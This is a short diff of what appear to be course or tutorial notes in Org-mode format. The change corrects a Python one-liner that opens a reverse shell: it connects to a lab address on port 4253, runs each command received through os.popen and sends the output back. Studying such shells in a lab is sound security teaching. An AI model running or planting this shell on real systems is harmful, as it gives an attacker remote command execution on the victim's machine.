@@ -9,15 +9,12 @@
 python -c "import socket
 import sys
 import os
-
-sock=socket.socket(socket.AF_INET, sock.SOCK_STREAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(('192.168.56.103', 4253))
-
 while True:
     cmd = sock.recv(1024)
     out = os.popen(cmd).read()
     sock.send(out)"
-
 #+END_SRC
 * Lecture
 * Tutorial
